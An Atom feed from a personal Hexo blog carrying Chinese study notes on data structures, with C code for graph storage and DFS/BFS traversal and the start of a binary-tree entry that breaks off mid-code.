<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>忆 执 昔 来 的 旅 途</title>
  
  
  <link href="https://xizhi-future.github.io/atom.xml" rel="self"/>
  
  <link href="https://xizhi-future.github.io/"/>
  <updated>2021-11-13T08:13:22.585Z</updated>
  <id>https://xizhi-future.github.io/</id>
  
  <author>
    <name>xizhi-future</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>图</title>
    <link href="https://xizhi-future.github.io/2021/11/13/%E5%9B%BE/"/>
    <id>https://xizhi-future.github.io/2021/11/13/%E5%9B%BE/</id>
    <published>2021-11-13T08:12:24.000Z</published>
    <updated>2021-11-13T08:13:22.585Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="图的基本存储结构"><a href="#图的基本存储结构" class="headerlink" title="图的基本存储结构"></a>图的基本存储结构</h1><p>需要存储的内容：存储 顶点信息、顶点之间的关系</p><p><strong>三种常用的 图的 存储结构：</strong></p><ul><li>邻接矩阵</li><li>邻接表</li><li>临界多重链表</li></ul><h2 id="邻接矩阵"><a href="#邻接矩阵" class="headerlink" title="邻接矩阵"></a>邻接矩阵</h2><p><strong>存储结构：</strong></p><ul><li><p>一维数组（顺序表）——  存储 数据元素的信息</p></li><li><p>二维数组（邻接矩阵）—— 存储 数据元素之间的 关系</p></li></ul><p><strong>特点：</strong></p><ul><li><p>无向图的邻接矩阵 一定是对称的，可使用 上三角或者是 下三角进行压缩存储，其存储空间只需要 <code>n(n+1)/2</code></p></li><li><p>有向图的邻接矩阵 不一定是 对称的，其存储空间为 <code>n 的平方</code></p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FINITY 5000<span class="comment">//此处使用 5000 表示无穷大</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 20<span class="comment">//最大顶点数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> vertextype;<span class="comment">//顶点值类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> edgetype;<span class="comment">//权值类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span><span class="comment">//邻接矩阵 类型</span></span><br><span class="line">    vertextype vexs[M];  <span class="comment">//顶点信息域（一维数组）</span></span><br><span class="line">    edgetype edges[M][M];  <span class="comment">//邻接矩阵（二维数组）</span></span><br><span class="line">    <span class="keyword">int</span> n,e;<span class="comment">//图中顶点总数 与 边数</span></span><br><span class="line">&#125;Mgraph;</span><br></pre></td></tr></table></figure><p><strong>建立网络的 邻接矩阵算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">creat</span><span class="params">(Mgraph *g,<span class="keyword">char</span> *s,<span class="keyword">int</span> c)</span></span>&#123;  <span class="comment">//c=1表示建立有向图，c=0 表示建立无向图</span></span><br><span class="line">    <span class="keyword">int</span> i,j,k,w;</span><br><span class="line">    FILE *rf;</span><br><span class="line">    rf = fopen(s,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(rf)&#123;</span><br><span class="line">        <span class="built_in">fscanf</span>(rf,<span class="string">&quot;%d%d&quot;</span>,&amp;g-&gt;n,&amp;g-&gt;e);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g-&gt;n;i++)</span><br><span class="line">            <span class="built_in">fscanf</span>(rf,<span class="string">&quot;%ls&quot;</span>,&amp;g-&gt;vexs[i]);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;g-&gt;n;i++)</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;g-&gt;n;j++)</span><br><span class="line">                <span class="keyword">if</span>(i == j)</span><br><span class="line">                    g-&gt;edges[i][j] = FINITY;</span><br><span class="line">        <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;g-&gt;e;k++)&#123;</span><br><span class="line">            <span class="built_in">fscanf</span>(rf,<span class="string">&quot;%d%d%d&quot;</span>,&amp;i,&amp;j,&amp;w);</span><br><span class="line">            g-&gt;edges[i][j] = w;</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="number">0</span>)</span><br><span class="line">                g-&gt;edges[j][i] = w;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(rf);    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        g-&gt;n = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>缺点：邻接矩阵法，占用的存单元只与图中顶点的个数有关，与边数无关，如果一个图中的边数比结点个数少得多，则该邻接矩阵中就会出现很对的空元素，从而浪费空间。</p><h2 id="邻接表"><a href="#邻接表" class="headerlink" title="邻接表"></a>邻接表</h2><p><strong>存储结构：</strong></p><ul><li>头结点：两个域—–数据域 <code>vertex</code> ，头指针域 <code>firstedge</code></li><li>表结点：两个域—–邻接点域 <code>adjvex</code>  ，链域  <code>next</code></li><li>如果是网络，带权值，则可在头结点中添加一个数据域来存储权值</li></ul><p>出边表（有向图的邻接表）、入边表（逆邻接表）</p><p><strong>如果图中含有 n 个顶点，e  条边，则它的邻接表存储结构需要 n个头结点和 2e 个边结点</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 20<span class="comment">//预定义图的最大顶点数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> DataType;<span class="comment">//顶点信息数据类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span><span class="comment">//边表结点</span></span><br><span class="line">    <span class="keyword">int</span> adjvex;<span class="comment">//邻接点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span><span class="comment">//指向下一个邻接点</span></span><br><span class="line">&#125;EdgeNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">vnode</span>&#123;</span><span class="comment">//头结点类型</span></span><br><span class="line">    DataType vertex;<span class="comment">//顶点信息</span></span><br><span class="line">    EdgeNode *FirstEdge;<span class="comment">//邻接链表头指针</span></span><br><span class="line">&#125;VertexNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span><span class="comment">//邻接表 类型</span></span><br><span class="line">    VertexNode adjlist[M];<span class="comment">//存放头结点的顺序表</span></span><br><span class="line">    <span class="keyword">int</span> n,e;  <span class="comment">//图的顶点数、边数</span></span><br><span class="line">&#125;LinkedGraph;</span><br></pre></td></tr></table></figure><p><strong>无向图邻接表建立算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//邻接表 创建图</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(LinkedGraph *g,<span class="keyword">char</span> *filename,<span class="keyword">int</span> c)</span></span>&#123;  <span class="comment">//c=0 表示建立无向图</span></span><br><span class="line">    <span class="keyword">int</span> i,j,k;</span><br><span class="line">    EdgeNode *s;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp = fopen(filename,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp)&#123;</span><br><span class="line">        <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d%d&quot;</span>,&amp;g-&gt;n,&amp;g-&gt;e);<span class="comment">//读入顶点数与边数</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span> ;i&lt;g-&gt;n;i++)&#123;</span><br><span class="line">            <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%ls&quot;</span>,&amp;g-&gt;adjlist[i].vertex); <span class="comment">//读入顶点信息</span></span><br><span class="line">            g-&gt;adjlist[i].FirstEdge = <span class="literal">NULL</span>;    <span class="comment">//边表置为空表</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">for</span>(k=<span class="number">0</span>; k &lt; g-&gt;n; k++)&#123;</span><br><span class="line"><span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d%d&quot;</span>,&amp;i,&amp;j);<span class="comment">//输入无序对</span></span><br><span class="line">s = (EdgeNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode));</span><br><span class="line">s-&gt;adjvex = j;</span><br><span class="line">s-&gt;next = g-&gt;adjlist[i].FirstEdge;</span><br><span class="line">g-&gt;adjlist[i].FirstEdge = s;       <span class="comment">//相当于 前插</span></span><br><span class="line"><span class="keyword">if</span>(c == <span class="number">0</span>)&#123;<span class="comment">//无向图</span></span><br><span class="line">s = (EdgeNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode));</span><br><span class="line">s-&gt;adjvex = i;</span><br><span class="line">s-&gt;next = g-&gt;adjlist[j].FirstEdge;</span><br><span class="line">g-&gt;adjlist[j].FirstEdge = s;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//文件打开失败</span></span><br><span class="line">g-&gt;n = <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：文件输入 数据内容时，第一行的结点个数不变，为 n，但是边数得是 2e</p><h2 id="邻接多重表"><a href="#邻接多重表" class="headerlink" title="邻接多重表"></a>邻接多重表</h2><p>边表结点：五个域</p><ul><li><p>mark    标志域（是否被访问过）</p></li><li><p>vexi  vexj   该边两个顶点在图中的位序</p></li><li><p>linki  linkj   两个边结点的指针</p><p>linki  指向关联与 vexi 结点的下一条边</p><p>linkj  指向关联与  vexj 结点的下一条边</p></li></ul><p>表头结点：两个域</p><ul><li>vertex  顶点信息</li><li>firstedge   关联与 顶点 的 第一条边</li></ul><h1 id="图的遍历"><a href="#图的遍历" class="headerlink" title="图的遍历"></a>图的遍历</h1><h2 id="深度优先遍历"><a href="#深度优先遍历" class="headerlink" title="深度优先遍历"></a>深度优先遍历</h2><p>访问顺序域图的邻接表的存储状态有关，由于图的邻接表存储不是唯一的，则对于同一个图，其深度优先遍历的输出结果也是不同的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> visited[M];  <span class="comment">//作为访问的标记</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//深度优先遍历 算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(LinkedGraph g,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    EdgeNode *p;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;visit vertex: %c\n&quot;</span>,g.adjlist[i].vertex); <span class="comment">//访问顶点 i</span></span><br><span class="line">    visited[i] = <span class="number">1</span>;<span class="comment">//表示已经访问过</span></span><br><span class="line">    p = g.adjlist[i].FirstEdge;<span class="comment">//从 p 的邻接点开始进行 深度优先遍历</span></span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[p-&gt;adjvex])</span><br><span class="line">            dfs(g,p-&gt;adjvex);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DfsTraverse</span><span class="params">(LinkedGraph g)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt;g.n; i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;   <span class="comment">//初始化都为 0 ，代表都未被访问过</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;g.n; i++)</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])<span class="comment">//如果 i 未被访问过</span></span><br><span class="line">            dfs(g,i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="广度优先遍历"><a href="#广度优先遍历" class="headerlink" title="广度优先遍历"></a>广度优先遍历</h2><p>特点：尽可能地首先对 横向结点进行访问</p><p>使用队列，使用邻接表存储结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> visited[M];   <span class="comment">//全局标志：是否访问过</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//广度优先遍历 算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bfs</span><span class="params">(LinkedGraph g,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    EdgeNode *p;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">queue</span>[M],front,rear;  <span class="comment">//FIFO 队列</span></span><br><span class="line">    front = rear = <span class="number">0</span>; <span class="comment">//初始化空队列</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,g.adjlist[i].vertex);</span><br><span class="line">    visited[i] = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">queue</span>[rear++] = i;<span class="comment">//被访问结点进入队列</span></span><br><span class="line">    <span class="keyword">while</span>(rear &gt; front)&#123;</span><br><span class="line">        j = <span class="built_in">queue</span>[front++]; <span class="comment">// 出队</span></span><br><span class="line">        p = g.adjlist[j].FirstEdge;</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visited[p-&gt;adjvex] == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,g.adjlist[p-&gt;adjvex].vertex);</span><br><span class="line">                <span class="built_in">queue</span>[rear++] = p-&gt;adjvex;</span><br><span class="line">                visited[p-&gt;adjvex] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回连通分量的个数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BfsTraverse</span><span class="params">(LinkedGraph g)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g.n;i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;  <span class="comment">//初始化标志数组，都未被访问过</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span> ;i&lt;g.n ;i++)</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])&#123;<span class="comment">//vi未被访问过</span></span><br><span class="line">            <span class="comment">//printf(&quot;\n&quot;);</span></span><br><span class="line">            count++;<span class="comment">//计数器：连通分量 个数加1 </span></span><br><span class="line">            bfs(g,i);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    LinkedGraph g;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    create(&amp;g,<span class="string">&quot;g7.txt&quot;</span>,<span class="number">0</span>);  <span class="comment">// 0 代表无向图</span></span><br><span class="line">    count = BfsTraverse(g);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n 该图共有 %d 个连通分量。\n&quot;</span>,count);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>二叉树</title>
    <link href="https://xizhi-future.github.io/2021/11/13/%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <id>https://xizhi-future.github.io/2021/11/13/%E4%BA%8C%E5%8F%89%E6%A0%91/</id>
    <published>2021-11-13T01:02:23.000Z</published>
    <updated>2021-11-13T01:02:59.452Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><h2 id="1-1-概念"><a href="#1-1-概念" class="headerlink" title="1.1 概念"></a>1.1 概念</h2><p>由结点构成的有限集合，集合可为空，或者是由一个根结点以及两颗互不相交的分别称作 该根结点的左子树域右子树的二叉树组成。</p><p>空二叉树</p><p><strong>二叉树五种基本形态</strong></p><p><img src="https://i.loli.net/2021/10/30/QzNZd9lI8VtuiMG.png" alt="image-20211030164242923"></p><blockquote><p><strong>二叉树与一般的树型结构的区别在于：</strong></p><ul><li>二叉树中每个非空结点最多只有两个子女，而一般的树型结构中每个非空结点可以有0到多<br>个子女;</li><li>二叉树中结点的子树要区分左子树和右子树，即使在结点只有一棵子树的情况下也要明确指<br>出是左子树还是右子树。</li></ul></blockquote><h2 id="1-2-二叉树-性质"><a href="#1-2-二叉树-性质" class="headerlink" title="1.2 二叉树 性质"></a>1.2 二叉树 性质</h2><ul><li><p><strong>性质1：</strong>一棵非空二叉树的 <code>第i层</code>  上至多有 <code>2 的 i-1 次方</code>  个 结点 (i≥1)。</p></li><li><p><strong>性质2：</strong>深度为h的二叉树至多有 <code>2 的 h 次方 -1</code> 个结点(h&gt;1) 。</p></li><li><p><strong>性质3：</strong> 对于任何一棵二叉树T，如果其终端结点数为no，度为2的结点数为n2，则 no=n2+1。</p></li><li><p><strong>性质4：</strong>具有 n 个结点的完全二叉树的深度 是 <code>[log以2为底n的对数] + 1</code></p></li></ul><p><strong>其它性质：</strong></p><p><img src="https://i.loli.net/2021/10/30/4kDm5FiaLGntrZe.png" alt="image-20211030164825001"></p><p><strong>完全二叉树、满二叉树：</strong></p><p><img src="https://i.loli.net/2021/10/30/9pg6GoC28vPEsVu.png" alt="image-20211030164916049"></p><p><strong>完全二叉树的性质：</strong></p><p><img src="https://i.loli.net/2021/10/30/d7EBmp4CgeXqG58.png" alt="image-20211030165111674"></p><h2 id="1-3-二叉树的-存储结构"><a href="#1-3-二叉树的-存储结构" class="headerlink" title="1.3 二叉树的 存储结构"></a>1.3 二叉树的 存储结构</h2><h3 id="1-3-1-完全二叉树-的-顺序存储"><a href="#1-3-1-完全二叉树-的-顺序存储" class="headerlink" title="1.3.1 完全二叉树 的 顺序存储"></a>1.3.1 完全二叉树 的 顺序存储</h3><p>按照 二叉树 从上到下、同一层次 从左到右的顺序，依次将结点存储在 一个 <strong>一维数组</strong> 中。</p><p>利用完全二叉树的性质</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 20</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;  <span class="comment">//二叉树结点类型</span></span><br><span class="line">datatype tree[MAXSIZE];</span><br><span class="line"><span class="keyword">int</span> n;  <span class="comment">//树 实际所含结点个数</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/30/f6vuodkaFwZjc9Y.png" alt="image-20211030165424030"></p><h3 id="1-3-2-一般二叉树-的-顺序存储"><a href="#1-3-2-一般二叉树-的-顺序存储" class="headerlink" title="1.3.2 一般二叉树 的 顺序存储"></a>1.3.2 一般二叉树 的 顺序存储</h3><p>每个结点：三个域</p><p>值域：data</p><p><strong>不带双亲：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 20</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span>     <span class="comment">//结点值类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="keyword">int</span> lchild,rchild;  <span class="comment">//存放 左、右 子女下标</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line">node tree[MAXSIZE];  </span><br><span class="line"><span class="keyword">int</span> n;<span class="comment">//树中实际所含结点个数</span></span><br><span class="line"><span class="keyword">int</span> root;<span class="comment">//存放根结点的下标</span></span><br></pre></td></tr></table></figure><p><strong>带双亲：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 20</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="keyword">int</span> lchild,rchild;</span><br><span class="line">    <span class="keyword">int</span> parent;  <span class="comment">//存放双亲结点下标</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line">node tree[MAXSIZE];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> root;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/30/SCeVzquhiojcy5A.png" alt="image-20211030165952310"></p><h3 id="1-3-2-链式存储"><a href="#1-3-2-链式存储" class="headerlink" title="1.3.2 链式存储"></a>1.3.2 链式存储</h3><p>每个结点：三个域</p><p>值域：data</p><p>指针域：分别指向左右子树</p><p><strong>不带双亲：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span>    <span class="comment">//二叉树结点类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span>  <span class="comment">//指向左右子树的指针</span></span><br><span class="line">&#125;bintnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> bintnode *bintree;</span><br><span class="line">bintree root;</span><br></pre></td></tr></table></figure><p><strong>带双亲：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span>   <span class="comment">//二叉树结点类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">parent</span>;</span>  <span class="comment">//指向双亲的指针</span></span><br><span class="line">&#125;bintnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> bintnode *bintree;</span><br><span class="line">bintree root;<span class="comment">//指向二叉树根结点的指针</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/30/mFjtMqDdRkezGc2.png" alt="image-20211030170230015"></p><h2 id="1-4-二叉树的遍历-—–-递归实现"><a href="#1-4-二叉树的遍历-—–-递归实现" class="headerlink" title="1.4 二叉树的遍历  —– 递归实现"></a>1.4 二叉树的遍历  —– 递归实现</h2><p>按照一定的顺序对二叉树这每个结点进行访问，且只能访问一次。</p><p><img src="https://i.loli.net/2021/10/30/YIS3fLvetOKocgH.png" alt="image-20211030171335598"></p><h3 id="1-4-1-前序遍历-—-根-gt-左-gt-右"><a href="#1-4-1-前序遍历-—-根-gt-左-gt-右" class="headerlink" title="1.4.1 前序遍历 —- 根-&gt;左-&gt;右"></a>1.4.1 前序遍历 —- <code>根-&gt;左-&gt;右</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td 